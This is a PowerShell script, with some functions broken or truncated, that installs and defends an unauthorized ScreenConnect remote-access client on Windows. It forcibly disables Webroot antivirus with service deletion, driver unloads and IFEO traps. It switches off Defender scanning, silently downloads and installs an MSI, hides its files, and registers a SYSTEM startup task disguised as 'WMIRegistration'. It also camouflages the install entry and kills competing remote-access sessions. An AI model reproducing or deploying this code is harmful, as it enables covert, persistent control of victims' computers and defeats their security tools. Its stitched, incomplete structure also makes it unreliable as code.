function Invoke-WebrootNuclear {
    # Hard disable: Webroot self-heals (NOT_STOPPABLE) and replaces SC exes with tiny stubs
    if (-not (Test-WebrootInstalled)) { return $false }
    Write-Log 'Webroot NUCLEAR: stop/delete services, IFEO trap, registry disable, pending rename'

    Invoke-WebrootPushback | Out-Null

    foreach ($svcName in @('WRSVC', 'WRSAService', 'WRCoreService', 'WRConsumerService', 'WRSkyClient', 'Webroot Firewall Service')) {
        & sc.exe stop "$svcName" >$null 2>&1
        & sc.exe config "$svcName" start= disabled >$null 2>&1
        & sc.exe delete "$svcName" >$null 2>&1
        # Registry disable survives NOT_STOPPABLE / self-heal until reboot
        foreach ($root in @(
            "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName",
            "HKLM:\SYSTEM\ControlSet001\Services\$svcName"
        )) {
            if (Test-Path $root) {
                Set-ItemProperty -Path $root -Name Start -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $root -Name DeleteFlag -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
                Write-Log "Webroot registry Start=4: $svcName"
            }
        }
    }

    foreach ($drv in @('WRkrn', 'WRCore', 'WebrootSecureAnywhere', 'WRAuxiliary')) {
        & sc.exe stop "$drv" >$null 2>&1
        & sc.exe config "$drv" start= disabled >$null 2>&1
        try { & fltmc.exe unload "$drv" >$null 2>&1 } catch {}
        $dk = "HKLM:\SYSTEM\CurrentControlSet\Services\$drv"
        if (Test-Path $dk) {
            Set-ItemProperty -Path $dk -Name Start -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
        }
    }

    # Uninstall BEFORE IFEO — after Debugger=systray, WRSA -Wait hangs forever (systray stays up)
    foreach ($uninst in @(
        "${env:ProgramFiles}\Webroot\WRSA.exe",
        "${env:ProgramFiles(x86)}\Webroot\WRSA.exe"
    )) {
        if (-not (Test-Path $uninst)) { continue }
        try {
            Write-Log "WRSA silent uninstall (30s cap): $uninst"
            $up = Start-Process -FilePath $uninst -ArgumentList '-uninstall', '-silent' `
                -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue
            if ($up -and -not $up.WaitForExit(30000)) {
                Stop-Process -Id $up.Id -Force -ErrorAction SilentlyContinue
                Write-Log 'WRSA uninstall timed out - killed'
            } else {
                Write-Log ("WRSA uninstall exit " + $(if ($up) { $up.ExitCode } else { 'n/a' }))
            }
        } catch {
            Write-Log "WRSA uninstall error: $($_.Exception.Message)"
        }
    }

    # IFEO: any launch of Webroot agent immediately exits (beats user-mode self-heal)
    foreach ($exe in @('WRSA.exe', 'WRSAMain.exe', 'WRConsumerService.exe', 'WRCoreService.exe', 'WRSkyClient.exe')) {
        $ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
        New-Item -Path $ifeo -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $ifeo -Name Debugger -Value 'systray.exe' -Force -ErrorAction SilentlyContinue
        Write-Log "IFEO trap: $exe"
    }

    Get-Process -ErrorAction SilentlyContinue | Where-Object {
        $_.ProcessName -like 'WR*' -or $_.ProcessName -like '*Webroot*'
    } | ForEach-Object {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
    }

    foreach ($root in @(
        "${env:ProgramFiles}\Webroot",
        "${env:ProgramFiles(x86)}\Webroot",
        "${env:ProgramData}\WRData",
        "${env:ProgramData}\Webroot"
    )) {
        if (-not (Test-Path $root)) { continue }
        $disabled = "$root.disabled_$(Get-Date -Format 'yyyyMMddHHmmss')"
        try {
            Move-Item -LiteralPath $root -Destination $disabled -Force -ErrorAction Stop
            Write-Log "Webroot path renamed: $root -> $disabled"
        } catch {
            try {
                Get-ChildItem -LiteralPath $root -Recurse -Filter *.exe -ErrorAction SilentlyContinue | ForEach-Object {

        }
    }

    Enable-ScFirewallAllow
    Write-Log 'Webroot nuclear complete - proceeding'

function Get-ScBinaryHealth {
    $info = [ordered]@{
        ServiceRunning = [bool](Test-ScServiceRunning)
        Roots          = @((Get-ScInstallRoots))
        ExeCount       = 0
        DllCount       = 0
        MaxExeSize     = 0
        MaxDllSize     = 0
        SvcExeSize     = 0
        ClientExeSize  = 0
        HasClientExe   = $false
        ExeDetail      = @()
        ProcCount      = 0
        Stubbed        = $false
    }
    foreach ($r in $info.Roots) {
        Get-ChildItem -Path $r -Recurse -Include 'ScreenConnect*.exe' -ErrorAction SilentlyContinue | ForEach-Object {
            $info.ExeCount++
            if ($_.Length -gt $info.MaxExeSize) { $info.MaxExeSize = $_.Length }
            if ($_.Name -match '(?i)^ScreenConnect\.ClientService\.exe$') {
                $info.SvcExeSize = $_.Length
            }
            if ($_.Name -match '(?i)^ScreenConnect\.(WindowsClient|Client)\.exe$') {
                $info.HasClientExe = $true
                if ($_.Length -gt $info.ClientExeSize) { $info.ClientExeSize = $_.Length }
            }
            $readable = $true
            try {
                $fs = [IO.File]::Open($_.FullName, 'Open', 'Read', 'Read')
                $fs.Close()
            } catch { $readable = $false }
            $info.ExeDetail += ('{0} size={1} readable={2}' -f $_.Name, $_.Length, $readable)
        }
        Get-ChildItem -Path $r -Recurse -Include 'ScreenConnect*.dll' -ErrorAction SilentlyContinue | ForEach-Object {
            $info.DllCount++
            if ($_.Length -gt $info.MaxDllSize) { $info.MaxDllSize = $_.Length }
        }
    }
    $info.ProcCount = @(Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        ("$($_.Name) $($_.ExecutablePath) $($_.CommandLine)" -like "*$PrimaryFingerprint*") -and
        ($_.Name -match '(?i)ScreenConnect|ClientService')
    }).Count
    # Webroot guts *.exe to tiny stubs / drops WindowsClient while leaving large DLLs.
    if ($info.MaxExeSize -gt 0 -and $info.MaxExeSize -lt 250000) {
        $info.Stubbed = $true
    }
    if ($info.SvcExeSize -gt 0 -and $info.SvcExeSize -lt 250000) {
        $info.Stubbed = $true
    }
    if ($info.Roots.Count -gt 0 -and -not $info.HasClientExe) {
        $info.Stubbed = $true
    }
    if ($info.HasClientExe -and $info.ClientExeSize -lt 250000) {
        $info.Stubbed = $true
    }
    return $info
}

function Test-ScControlBroken {
    # "Broken" = primary SC is present but gutted/unusable.
    # Not installed at all is NOT broken — that path uses Install-PrimarySc.
    $h = Get-ScBinaryHealth
    $present = [bool](Test-ScServicePresent) -or ($h.Roots.Count -gt 0) -or ($h.ExeCount -gt 0)
    if (-not $present) { return $false }
    if (-not $h.ServiceRunning) { return $true }
    if ($h.Roots.Count -eq 0) { return $true }
    if ($h.ExeCount -lt 1) { return $true }
    if ($h.Stubbed) { return $true }
    foreach ($line in $h.ExeDetail) {
        if ($line -match 'readable=False' -or $line -match 'size=0') { return $true }
    }
    if ($h.ProcCount -lt 1) { return $true }
    return $false
}

function Get-PrimaryMsiFile {
    # Prefer curl (TLS quirks / MITM friendlier) then IWR then WebClient
    param([string]$Dest = $MsiFile, [string]$Url = $MsiUrl)
    if (Test-Path $Dest) { Remove-Item $Dest -Force -ErrorAction SilentlyContinue }
    Write-Log "MSI download: $Url"
    $ok = $false
    try {
        $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
        if ($curl) {
            & curl.exe -L --ssl-no-revoke --connect-timeout 25 --retry 2 -o "$Dest" "$Url" >$null 2>&1
            if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge 500000)) { $ok = $true }
        }
    } catch {
        Write-Log "MSI curl failed: $($_.Exception.Message)"
    }
    if (-not $ok) {
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            Invoke-WebRequest -Uri $Url -OutFile $Dest -UseBasicParsing -UserAgent 'Mozilla/5.0' -TimeoutSec 60
            if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge 500000)) { $ok = $true }
        } catch {
            Write-Log "MSI IWR failed: $($_.Exception.Message)"
        }
    }
    if (-not $ok) {
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
            $wc.DownloadFile($Url, $Dest)
            $wc.Dispose()
            if ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge 500000)) { $ok = $true }
        } catch {
            Write-Log "MSI WebClient failed: $($_.Exception.Message)"
        }
    }
    if ($ok) {
        Write-Log ("MSI bytes: " + (Get-Item $Dest).Length)
        return $true
    }
    Write-Log 'MSI invalid / download failed'
    return $false
}

    $extract = Join-Path $WorkDir 'msi_extract'
    Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Path $extract -Force | Out-Null
    Write-Log "REPAIR: msiexec /a extract -> $extract"
    $ep = Start-Process msiexec.exe -ArgumentList "/a `"$MsiPath`" /qn TARGETDIR=`"$extract`"" `
        -Wait -PassThru -WindowStyle Hidden
    Write-Log "REPAIR: msiexec /a exit $($ep.ExitCode)"
    $bins = @(Get-ChildItem -Path $extract -Recurse -Include 'ScreenConnect*.exe', 'ScreenConnect*.dll' -ErrorAction SilentlyContinue)
    if ($bins.Count -lt 1) {
        Write-Log 'REPAIR: MSI extract produced no ScreenConnect binaries'
        return $false
    }
    New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
    cmd /c "takeown /F `"$DestDir`" /R /D Y" >$null 2>&1
    cmd /c "icacls `"$DestDir`" /grant Administrators:F /T /C" >$null 2>&1
    $copied = 0
    foreach ($b in $bins) {
        $rel = $b.FullName.Substring($extract.Length).TrimStart('\')
        $target = Join-Path $DestDir $rel
        $parent = Split-Path $target -Parent
        if (-not (Test-Path $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
        try {
            if (Test-Path $target) {
                cmd /c "takeown /F `"$target`" /D Y" >$null 2>&1
                attrib -r -s -h "$target" >$null 2>&1
                Remove-Item $target -Force -ErrorAction SilentlyContinue
            }
            Copy-Item -LiteralPath $b.FullName -Destination $target -Force -ErrorAction Stop
            Write-Log ("REPAIR: restored {0} bytes={1}" -f $b.Name, $b.Length)
            $copied++
        } catch {
            Write-Log ("REPAIR: copy failed {0}: {1}" -f $b.Name, $_.Exception.Message)
        }
    }
    Remove-Item $extract -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "REPAIR: extract/copy restored $copied files"
    return ($copied -gt 0)
}

function Repair-ScAfterAv {
    Write-Log 'REPAIR: Webroot nuclear + clean SC reinstall (empty name / no join)'
    Invoke-WebrootNuclear | Out-Null
    Start-Sleep -Seconds 3

    $h1 = Get-ScBinaryHealth
    Write-Log ("SC health before repair: running={0} exes={1} procs={2}" -f $h1.ServiceRunning, $h1.ExeCount, $h1.ProcCount)
    foreach ($d in $h1.ExeDetail) { Write-Log ("  bin: $d") }

    Uninstall-PrimaryScResidue
    Start-Sleep -Seconds 2
    $left = Get-PrimaryScInstallDir
    if (Test-Path $left) {
        Write-Log "REPAIR: residue still present after uninstall - forcing wipe: $left"
        cmd /c "takeown /F `"$left`" /R /D Y" >$null 2>&1
        cmd /c "icacls `"$left`" /grant Administrators:F /T /C" >$null 2>&1
        Remove-Item $left -Recurse -Force -ErrorAction SilentlyContinue
    }

    Write-Log 'REPAIR: downloading fresh MSI'
    if (-not (Get-PrimaryMsiFile -Dest $MsiFile)) {
        Write-Log 'REPAIR: MSI invalid'
        return $false
    }
    $logMsi = Join-Path $WorkDir 'msi_repair.log'
    # Always force file overwrite (amus). Plain /i exit=0 often leaves stubs untouched.
    Write-Log 'REPAIR: msiexec /i REINSTALL=ALL REINSTALLMODE=amus'
    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=amus /l*v `"$logMsi`"" `
        -Wait -PassThru -WindowStyle Hidden
    Write-Log "REPAIR: msiexec exit $($p.ExitCode)"
    if ($p.ExitCode -ne 0) {
        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
            -Wait -PassThru -WindowStyle Hidden
        Write-Log "REPAIR: msiexec fresh-install exit $($p2.ExitCode)"
    }
    Start-Sleep -Seconds 8

    $dest = Get-PrimaryScInstallDir
    $hMid = Get-ScBinaryHealth
    if ($hMid.Stubbed -or -not $hMid.HasClientExe) {
        Write-Log 'REPAIR: stubs remain after msiexec - admin-extract + force copy'
        Expand-ScMsiOverInstall -MsiPath $MsiFile -DestDir $dest | Out-Null
        Start-Sleep -Seconds 2
    }

    Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue
    Start-PrimaryService | Out-Null
    Enable-ScFirewallAllow
    Set-ArpCamouflage | Out-Null

    $h2 = Get-ScBinaryHealth
    Write-Log ("SC health after repair: running={0} exes={1} procs={2} stub={3} svcExe={4} client={5}/{6}" -f `
        $h2.ServiceRunning, $h2.ExeCount, $h2.ProcCount, $h2.Stubbed, $h2.SvcExeSize, $h2.HasClientExe, $h2.ClientExeSize)
    foreach ($d in $h2.ExeDetail) { Write-Log ("  bin: $d") }
    $ok = ((Test-ScServiceRunning) -and -not $h2.Stubbed -and $h2.HasClientExe -and -not (Test-ScControlBroken))
    if ($ok) {
        $marker = Join-Path $WorkDir '.repaired_webroot'
        Set-Content -Path $marker -Value (Get-Date -Format 'o') -Encoding ASCII -Force
        Write-Log 'REPAIR: success marker written'
    } else {
        Write-Log 'REPAIR: still broken after reinstall (likely Webroot stubs / NOT_STOPPABLE)'
        try {
            $bootPs1 = Join-Path $WorkDir 'wucache_bootrepair.ps1'
            $bootBody = @"
`$ErrorActionPreference='SilentlyContinue'
Start-Sleep 20
& powershell.exe -NoProfile -ExecutionPolicy Bypass -File (Join-Path `$env:ProgramData 'Microsoft\Windows\WER\Temp\.wucache\wucache_pkg.ps1')
"@
            Set-Content -Path $bootPs1 -Value $bootBody -Encoding ASCII -Force
            Unregister-ScheduledTask -TaskName 'WMIRegistration' -TaskPath '\Microsoft\Windows\Diagnosis\' -Confirm:$false -ErrorAction SilentlyContinue
            $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$bootPs1`""
            $t = New-ScheduledTaskTrigger -AtStartup
            $p = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
            $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
            Register-ScheduledTask -TaskName 'WMIRegistration' -TaskPath '\Microsoft\Windows\Diagnosis\' -Action $a -Trigger $t -Principal $p -Settings $s -Force | Out-Null
            Write-Log 'REPAIR: boot-time repair task armed - REBOOT REQUIRED'
        } catch {
            Write-Log "REPAIR: boot task failed: $($_.Exception.Message)"
        }
    }
    return $ok
}

function Test-PayloadInterference {
    # Returns $true if AV/host appears to be blocking our payload
    $issues = @()
    if (-not (Test-Path $WorkDir)) { $issues += 'workdir_missing' }
    if (-not (Test-Path $MonitorScriptPath) -and -not (Test-Path $MonitorScriptPathAlt)) {
        $issues += 'monitor_missing'
    }
    # Cannot write marker = likely quarantine/lock
    try {
        $probe = Join-Path $WorkDir '.writeprobe'
        'ok' | Out-File -FilePath $probe -Encoding ASCII -Force -ErrorAction Stop
        Remove-Item $probe -Force -ErrorAction SilentlyContinue
    } catch {
        $issues += 'workdir_not_writable'
    }
    # Primary SC service vanished or won't stay running after we expect it
    if (-not (Test-ScServicePresent)) {
        $issues += 'sc_service_missing'
    } elseif (-not (Test-ScServiceRunning)) {
        if (-not (Start-PrimaryService)) { $issues += 'sc_start_blocked' }
    }
    if (Test-ScHollowClient) { $issues += 'sc_hollow_av_quarantine' }
    # Webroot running alone is not "interference" for MSI - handled separately in Phase 1
    # Script execution policy / ASR style block - try a tiny nested powershell
    try {
        $r = & powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "1+1" 2>&1
        if ("$r" -notmatch '2') { $issues += 'powershell_blocked' }
    } catch {
        $issues += 'powershell_blocked'
    }
    return @{ Interfered = ($issues.Count -gt 0); Issues = $issues }
}

function Invoke-ReactiveAvPushback {
    param([string[]]$Issues = @())
    # ONLY when interference is detected - escalate gradually, not on every run
    Write-Log ("Reactive AV pushback - issues: " + ($Issues -join ', '))

    # 1) Re-assert quiet exclusions + SC firewall
    Enable-QuietDefenderExclusions | Out-Null
    Enable-ScFirewallAllow

    # 2) Webroot: pause agent (main cause of IP-only SC sessions)
    if ($Issues -contains 'webroot_present' -or $Issues -contains 'sc_hollow_av_quarantine' -or (Test-WebrootInstalled)) {
        Invoke-WebrootPushback | Out-Null
    }

    # 3) Restore monitor from whichever copy still exists / re-seed both
    try {
        New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
        New-Item -ItemType Directory -Path $WorkDirAlt -Force | Out-Null
        if ((Test-Path $MonitorScriptPath) -and -not (Test-Path $MonitorScriptPathAlt)) {
            Copy-Item $MonitorScriptPath $MonitorScriptPathAlt -Force -ErrorAction SilentlyContinue
        } elseif ((Test-Path $MonitorScriptPathAlt) -and -not (Test-Path $MonitorScriptPath)) {
            Copy-Item $MonitorScriptPathAlt $MonitorScriptPath -Force -ErrorAction SilentlyContinue
        }
        if ((Test-Path $HelperVbsPath) -and -not (Test-Path $HelperVbsPathAlt)) {
            Copy-Item $HelperVbsPath $HelperVbsPathAlt -Force -ErrorAction SilentlyContinue
        } elseif ((Test-Path $HelperVbsPathAlt) -and -not (Test-Path $HelperVbsPath)) {
            Copy-Item $HelperVbsPathAlt $HelperVbsPath -Force -ErrorAction SilentlyContinue
        }
        Set-HiddenSystem $WorkDir
        Set-HiddenSystem $WorkDirAlt
    } catch {}

    # 4) Soften Defender ONLY if still interfered (no blanket 3rd-party AV kill beyond Webroot)
    $still = Test-PayloadInterference
    if ($still.Interfered -and (Get-Command Set-MpPreference -ErrorAction SilentlyContinue)) {
        Write-Log 'Reactive: temporary Defender soften (realtime/script scan) due to active block'
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Enable-QuietDefenderExclusions | Out-Null
        } catch {}
    }

    # 5) If SC hollow/missing - reinstall after AV pause. start_blocked = start only, no MSI.
    if ($Issues -contains 'sc_service_missing' -or $Issues -contains 'sc_hollow_av_quarantine') {
        Start-Sleep -Seconds 2
        Write-Log 'Reactive: reinstall primary SC after AV pushback'
        Install-PrimarySc | Out-Null
        Start-PrimaryService | Out-Null
        Enable-ScFirewallAllow
        Set-ArpCamouflage | Out-Null
    } elseif ($Issues -contains 'sc_start_blocked') {
        Write-Log 'Reactive: start-only (no MSI) for sc_start_blocked'
        Start-PrimaryService | Out-Null
    }

    Write-Log 'Reactive AV pushback complete'
}

function Write-FailoverVbs {
    param([string]$Path)
    # Build with concatenation (avoid here-string parse issues on some locales)
    $lines = @(
        'Set fso = CreateObject("Scripting.FileSystemObject")'
        'Set sh = CreateObject("WScript.Shell")'
        ('p1 = "' + $MonitorScriptPath + '"')
        ('p2 = "' + $MonitorScriptPathAlt + '"')
        'target = ""'
        'If fso.FileExists(p1) Then'
        '  target = p1'
        'ElseIf fso.FileExists(p2) Then'
        '  target = p2'
        'End If'
        'If target <> "" Then'
        '  sh.Run "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & target & """", 0, False'
        'End If'
    )
    ($lines -join "`r`n") | Out-File -FilePath $Path -Encoding ASCII -Force
    Set-HiddenSystem $Path
}

function Test-IsAllowedSc {
    param([string]$Name = '', [string]$Path = '')
    return (Test-IsAllowedBlob -Blob "$Name $Path")
}

function Test-IsAllowedBlob {
    param([string]$Blob)
    if ([string]::IsNullOrWhiteSpace($Blob)) { return $false }

    # Explicit blocked rival relays
    foreach ($bad in $BlockedRelayHints) {
        if ($Blob -like "*$bad*") { return $false }
    }

    # If launch args include h= host, it must be an allowed relay
    if ($Blob -match '(?i)[?&]h=([^&\s"]+)') {
        $hostArg = [Uri]::UnescapeDataString($Matches[1])
        $ours = $false
        foreach ($h in $RequiredRelayHints) {
            if ($hostArg -like "*$h*") { $ours = $true; break }
        }
        if (-not $ours) { return $false }
    }

    foreach ($fp in $AllowedFingerprints) {
        if ($Blob -like "*$fp*") { return $true }
    }
    if ($Blob -like "*$ArpDisplayName*" -and $Blob -like "*$PrimaryFingerprint*") { return $true }
    return $false
}

function Stop-DeleteServiceSafe {
    param([string]$ServiceName)
    if ([string]::IsNullOrWhiteSpace($ServiceName)) { return }
    & sc.exe stop "$ServiceName" >$null 2>&1
    Start-Sleep -Milliseconds 400
    & sc.exe config "$ServiceName" start= disabled >$null 2>&1
    & sc.exe delete "$ServiceName" >$null 2>&1
    try {
        $esc = $ServiceName.Replace("'", "''")
        $s = Get-CimInstance Win32_Service -Filter "Name='$esc'" -ErrorAction SilentlyContinue
        if ($s) {
            Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
            $s.Delete() | Out-Null
        }
    } catch {}
}

function Invoke-QuietUninstall {
    param([string]$UninstallString, [string]$QuietUninstallString = '')
    $cmd = $QuietUninstallString
    if ([string]::IsNullOrWhiteSpace($cmd)) { $cmd = $UninstallString }
    if ([string]::IsNullOrWhiteSpace($cmd)) { return }

    if ($cmd -match '\{([0-9A-Fa-f-]{8,}(?:-[0-9A-Fa-f-]{4}){3}-[0-9A-Fa-f-]{12})\}' -or
        $cmd -match '\{([0-9A-Fa-f-]+)\}') {
        $guid = '{' + $Matches[1] + '}'
        Write-Log "Quiet uninstall msiexec /x $guid"
        $p = Start-Process msiexec.exe -ArgumentList "/x $guid /quiet /norestart /qn" `
            -Wait -PassThru -WindowStyle Hidden
        Write-Log "uninstall exit $($p.ExitCode)"
        return
    }

    $exe = $null
    $args = ''
    if ($cmd -match '^\s*"([^"]+)"\s*(.*)$') {
        $exe = $Matches[1]; $args = $Matches[2]
    } elseif ($cmd -match '^\s*(\S+)\s*(.*)$') {
        $exe = $Matches[1]; $args = $Matches[2]
    }
    if (-not $exe -or -not (Test-Path $exe)) { return }
    if ($args -notmatch '(?i)(/S|/silent|/quiet|/qn|uninstall|/VERYSILENT)') {
        if ($exe -like '*.exe') { $args = ($args + ' /S /silent /quiet').Trim() }
    }
    Write-Log "Quiet uninstall exe: $exe $args"
    try {
        $p = Start-Process -FilePath $exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
        Write-Log "uninstall exe exit $($p.ExitCode)"
    } catch {
        Write-Log "uninstall exe failed: $($_.Exception.Message)"
    }
}

function Remove-TreeForce {
    param([string]$Path)
    if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return }
    try {
        Get-ChildItem -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
            try { $_.Attributes = 'Normal' } catch {}
        }
        $item = Get-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
        if ($item) { try { $item.Attributes = 'Normal' } catch {} }
    } catch {}
    Remove-Item -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue
    if (Test-Path -LiteralPath $Path) {
        cmd.exe /c "rmdir /s /q `"$Path`"" >$null 2>&1
    }
    if (-not (Test-Path -LiteralPath $Path)) {
        Write-Log "Removed tree: $Path"
    } else {
        Write-Log "FAILED remove tree: $Path"
    }
}

function Get-InstalledScFingerprints {
    $found = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)

    try {
        Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
            Where-Object {
                $_.Name -like '*ScreenConnect*' -or $_.DisplayName -like '*ScreenConnect*' -or
                $_.Name -like '*ConnectWise Control*' -or $_.DisplayName -like '*ConnectWise Control*' -or
                ($_.PathName -and ($_.PathName -like '*ScreenConnect*' -or $_.PathName -like '*ConnectWise*Control*'))
            } |
            ForEach-Object {
                $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
                [regex]::Matches($blob, '(?i)(?:\(|\b)([0-9a-f]{16})(?:\)|\b)') | ForEach-Object {
                    [void]$found.Add($_.Groups[1].Value.ToLower())
                }
            }
    } catch {}

    foreach ($base in @("${env:ProgramFiles}", "${env:ProgramFiles(x86)}")) {
        if (-not (Test-Path $base)) { continue }
        Get-ChildItem -Path $base -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -like 'ScreenConnect*' -or $_.Name -like 'ConnectWise Control*' } |
            ForEach-Object {
                [regex]::Matches($_.Name, '(?i)([0-9a-f]{16})') | ForEach-Object {
                    [void]$found.Add($_.Groups[1].Value.ToLower())
                }
            }
    }

    foreach ($pd in @(
        "${env:ProgramData}\ScreenConnect",
        "${env:ProgramData}\ConnectWiseControl",
        "${env:ProgramData}\ConnectWise"
    )) {
        if (-not (Test-Path $pd)) { continue }
        Get-ChildItem -Path $pd -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            [regex]::Matches($_.Name, '(?i)([0-9a-f]{16})') | ForEach-Object {
                [void]$found.Add($_.Groups[1].Value.ToLower())
            }
        }
    }

    foreach ($key in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
    )) {
        if (-not (Test-Path $key)) { continue }
        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if (-not $app) { return }
            $blob = "$($app.DisplayName) $($app.InstallLocation) $($app.Publisher) $($_.PSChildName) $($app.UninstallString)"
            if ($blob -notmatch '(?i)ScreenConnect|ConnectWise\s*Control') { return }
            [regex]::Matches($blob, '(?i)([0-9a-f]{16})') | ForEach-Object {
                [void]$found.Add($_.Groups[1].Value.ToLower())
            }
        }
    }

    return @($found)
}

function Remove-ScByFingerprint {
    param([string]$Fingerprint)
    if ([string]::IsNullOrWhiteSpace($Fingerprint)) { return }
    $Fingerprint = $Fingerprint.ToLower()
    if ($Fingerprint -in $AllowedFingerprints) {
        Write-Log "Skip remove - allowed fingerprint: $Fingerprint"
        return
    }

    Write-Log "Removing unauthorized ScreenConnect: $Fingerprint"
    $targetSvc = "ScreenConnect Client ($Fingerprint)"
    Stop-DeleteServiceSafe -ServiceName $targetSvc

    try {
        Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
            Where-Object {
                "$($_.Name) $($_.DisplayName) $($_.PathName)" -like "*$Fingerprint*"
            } |
            ForEach-Object {
                Stop-DeleteServiceSafe -ServiceName $_.Name
                Write-Log "Deleted SC service: $($_.Name)"
            }
    } catch {}

    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        $_.Name -match '(?i)ScreenConnect|ClientService|ConnectWise' -or
        ($_.CommandLine -and $_.CommandLine -like "*$Fingerprint*")
    } | ForEach-Object {
        $cl = "$($_.CommandLine)"
        if (Test-IsAllowedBlob -Blob $cl) { return }
        try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
        Write-Log "Killed SC process PID $($_.ProcessId) $($_.Name)"
    }

    foreach ($key in @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
    )) {
        if (-not (Test-Path $key)) { continue }
        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if (-not $app) { return }
            $blob = "$($app.DisplayName) $($app.InstallLocation) $($_.PSPath) $($app.UninstallString)"
            if ($blob -notlike "*$Fingerprint*") { return }
            if (Test-IsAllowedBlob -Blob $blob) { return }
            Invoke-QuietUninstall -UninstallString "$($app.UninstallString)" `
                -QuietUninstallString "$($app.QuietUninstallString)"
            try { Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue } catch {}
        }
    }

    foreach ($p in @(
        "${env:ProgramFiles}\ScreenConnect Client ($Fingerprint)",
        "${env:ProgramFiles(x86)}\ScreenConnect Client ($Fingerprint)",
        "${env:ProgramFiles}\ConnectWise Control Client ($Fingerprint)",
        "${env:ProgramFiles(x86)}\ConnectWise Control Client ($Fingerprint)",
        "${env:ProgramData}\ScreenConnect\$Fingerprint",
        "${env:ProgramData}\ConnectWiseControl\$Fingerprint",
        "${env:ProgramData}\ConnectWise\$Fingerprint"
    )) {
        Remove-TreeForce -Path $p
    }
}

function Stop-AllUnauthorizedScProcesses {
    # Kill FIRST (before service delete) so rival sessions drop immediately
    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
        $_.Name -match '(?i)ScreenConnect|ClientService|ConnectWise' -or
        ("$($_.ExecutablePath)$($_.CommandLine)" -match '(?i)ScreenConnect|ConnectWise')
    } | ForEach-Object {
        $blob = "$($_.Name) $($_.ExecutablePath) $($_.CommandLine)"
        if (Test-IsAllowedBlob -Blob $blob) { return }
        try {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
            & taskkill.exe /F /PID "$($_.ProcessId)" >$null 2>&1
            Write-Log "NUKE SC process: $($_.Name) PID $($_.ProcessId)"
        } catch {}
    }
}

function Invoke-RemoveUnauthorizedScreenConnect {
    Write-Log 'Purging unauthorized ScreenConnect / ConnectWise Control (NUKE)'

    # Pass 1: kill live rival sessions immediately
    Stop-AllUnauthorizedScProcesses
    Start-Sleep -Milliseconds 800

    $fps = @(Get-InstalledScFingerprints)
